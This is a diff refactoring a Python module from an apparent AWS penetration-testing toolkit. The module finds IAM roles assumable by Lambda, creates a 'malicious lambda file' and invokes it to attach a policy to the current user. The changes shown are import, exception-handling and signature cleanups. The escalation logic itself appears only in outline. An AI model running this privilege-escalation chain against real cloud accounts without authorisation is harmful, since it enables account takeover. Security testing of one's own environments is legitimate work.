@@ -1,9 +1,9 @@
 # Create a module that will create a lambda and invoke to attach a user policy on the predetermined user.
-import boto3
+import botocore
 import zipfile
 from modules.enumeration import iam_whoami as whoami
 from modules.enumeration import iam_enumerate_assume_role
-from functions import create_client
+from functions import create_client, iam_handler
 from colorama import Fore, Style
 from time import sleep
 
@@ -24,15 +24,14 @@ def help():
     print("\t")
     print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
 
-def get_user_name(botoconfig, session, selected_session):
-    user_name = whoami.main(botoconfig, session, selected_session)
+def get_user_name(botoconfig, session):
+    user_name = whoami.main(botoconfig, session)
 
     return user_name
 
 def check_assumable_roles(botoconfig, session):
-    service = 'iam'
-    client = session.client(service, config=botoconfig)
-    assumable_roles = iam_enumerate_assume_role.get_assumable_roles(client)
+    iam = iam_handler.IAM(botoconfig, session)
+    assumable_roles = iam_enumerate_assume_role.get_assumable_roles(iam)
 
     lambda_assumable_roles = []
     
@@ -42,8 +41,8 @@ def check_assumable_roles(botoconfig, session):
                 for principal in role['AssumeRolePolicyDocument']['Statement']:
                     if principal['Principal']['Service'] == 'lambda.amazonaws.com':
                         lambda_assumable_roles.append(role['Arn'])
-        except:
-            next
+        except (KeyError, TypeError):
+            continue
     
     return lambda_assumable_roles
 
@@ -129,12 +128,12 @@ def invoke_lambda(client, function_name):
 
     return response
 
-def main(botoconfig, session, selected_session):
+def main(botoconfig, session):
     print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
     print("[+] Starting lambda privilege escalation module...")
 
     print("[+] Checking for current username...")
-    username = get_user_name(botoconfig, session, selected_session)
+    username = get_user_name(botoconfig, session)
 
     print("[+] Listing assumable roles...")
     assumable_roles = check_assumable_roles(botoconfig, session)
@@ -148,7 +147,7 @@ def main(botoconfig, session, selected_session):
     print("[+] Creating malicious lambda file...")
     region = input("[+] Select the region to create the lambda function: ")
     lambda_client = create_lambda_client(botoconfig, session, region)
-    lambda_file = create_lambda_file(username['current_user'])
+    lambda_file = create_lambda_file(username)
     if not lambda_file:
         return False
 
@@ -167,6 +166,6 @@ def main(botoconfig, session, selected_session):
     try:
         function_run_results = invoke_lambda(lambda_client, lambda_function['FunctionName'])
         print("[+] Lambda Invoke Successfull! Enjoy...")
-    except Exception as e:
+    except botocore.exceptions.ClientError as e:
         print("[-] Lambda failed to run...Status code "+Fore.RED+"{}".format(e)+Style.RESET_ALL)
     
